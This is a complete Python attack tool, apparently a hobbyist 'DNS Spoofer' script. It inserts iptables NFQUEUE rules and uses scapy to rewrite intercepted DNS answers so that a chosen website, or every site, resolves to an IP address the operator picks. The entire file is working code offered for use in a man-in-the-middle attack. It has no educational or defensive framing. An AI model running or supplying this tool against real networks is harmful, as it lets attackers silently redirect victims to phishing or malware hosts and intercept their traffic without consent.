#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy
from colorama import Fore, Style
import argparse
import os


'''
LOGO
'''
print(Fore.RED + Style.BRIGHT + '''

//   ▓█████▄  ███▄    █   ██████       ██████  ██▓███   ▒█████   ▒█████     █████▓█████ ██▀███
//    ▒██▀ ██▌ ██ ▀█   █ ▒██    ▒     ▒██    ▒ ▓██░  ██ ▒██▒  ██▒▒██▒  ██▒ ▓██    ▓█   ▀▓██ ▒ ██▒
//    ░██   █▌▓██  ▀█ ██▒░ ▓██▄       ░ ▓██▄   ▓██░ ██▓▒▒██░  ██▒▒██░  ██▒ ▒████  ▒███  ▓██ ░▄█ ▒
//    ▒░▓█▄   ▌▓██▒  ▐▌██▒  ▒   ██▒      ▒   ██▒▒██▄█▓▒ ▒▒██   ██░▒██   ██░ ░▓█▒   ▒▓█  ▄▒██▀▀█▄
//    ░░▒████▓ ▒██░   ▓██░▒██████▒▒    ▒██████▒▒▒██▒ ░  ░░ ████▓▒░░ ████▓▒░▒░▒█░   ░▒████░██▓ ▒██▒
//    ░ ▒▒▓  ▒ ░ ▒░   ▒ ▒ ▒ ▒▓▒ ▒ ░    ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒ ░   ░░ ▒░ ░ ▒▓ ░▒▓░
//      ░ ▒  ▒ ░ ░░   ░ ▒░░ ░▒  ░      ░ ░▒  ░  ░▒ ░       ░ ▒ ▒░   ░ ▒ ▒░ ░ ░      ░ ░    ░▒ ░ ▒░
//      ░ ░  ░    ░   ░ ░ ░  ░  ░      ░  ░  ░  ░░       ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░      ░     ░   ░
//        ░             ░       ░            ░               ░ ░      ░ ░  ░          ░     ░
//   by ---------- WX                                                                  
''' + Fore.LIGHTWHITE_EX)


'''
GLOBALS
'''
website = ''
redirect_ip = ''
locally = ''


'''
ARGS PARSER & VALIDATOR
'''
parser = argparse.ArgumentParser()
parser.add_argument('-r', '--redirect-ip', dest='redirect_ip', help='IP address to which traffic need to be redirect.')
parser.add_argument('-w', '--web', dest='website', help='website to be spoofed , leave empty to spoofed all.')
parser.add_argument('-l', '--locally', dest='locally', help='enter "1" if you want to start attack locally.')
args = parser.parse_args()


try:
    if args.redirect_ip:
        redirect_ip = args.redirect_ip
    else:
        redirect_ip = input(Fore.LIGHTWHITE_EX + Style.BRIGHT + '[~]' + Fore.LIGHTWHITE_EX + ' Please Enter IP to which redirect : ')
    if args.locally:
        locally = args.locally
    else:
        locally = input(Fore.LIGHTWHITE_EX + Style.BRIGHT + '[~]' + Fore.LIGHTWHITE_EX + ' Please Enter "1" if you want to start attack locally. \nLeave empty to start default attack : ')
    if args.website:
        website = args.website
    else:
        website = input(Fore.LIGHTWHITE_EX + Style.BRIGHT + '[~]' + Fore.LIGHTWHITE_EX + 'Please Enter website from which to redirect, \nLeave empty to redirect all traffic : ')
except KeyboardInterrupt:
    print('\n' + Style.BRIGHT + Fore.LIGHTGREEN_EX + '[*]' + Fore.WHITE + Style.BRIGHT + ' Restoring iptables...')
    os.system('iptables --flush')
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '[*]' + Fore.WHITE + Style.BRIGHT + ' Successfully restored iptables ')
    print(Style.BRIGHT + Fore.RED + '[*]' + Fore.RED + Style.BRIGHT + ' Quitting....')
    exit(0)


'''
CREATING IPTABLES
'''
try:
    if locally == '1':
        os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
        os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
    else:
        os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
    print(Style.BRIGHT + Fore.GREEN + '[*] iptables create successfully')
except:
    print(Style.BRIGHT + Fore.RED + '[*] Fail to create iptables, try again')
    os.system('iptables --flush')
    print(Style.BRIGHT + Fore.RED + '[*] Quitting....')
    exit(1)


queue = netfilterqueue.NetfilterQueue()


'''
PACKAGE MODIFICATION
'''
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if website in str(qname):
            print(Fore.RED + Style.BRIGHT + '[*]' + Fore.LIGHTWHITE_EX + Style.BRIGHT + ' Redirecting ' + str(qname) + ' to ' + redirect_ip)
            answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


'''
RUN & EXIT
'''
queue.bind(0, process_packet)
try:
    queue.run()
except KeyboardInterrupt:
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '[*] Restoring iptables...')
    os.system('iptables --flush')
    print(Style.BRIGHT + Fore.LIGHTGREEN_EX + '[*] Successfully restored iptables ')
    print(Style.BRIGHT + Fore.RED + '[*] Quitting....')
    exit(0)
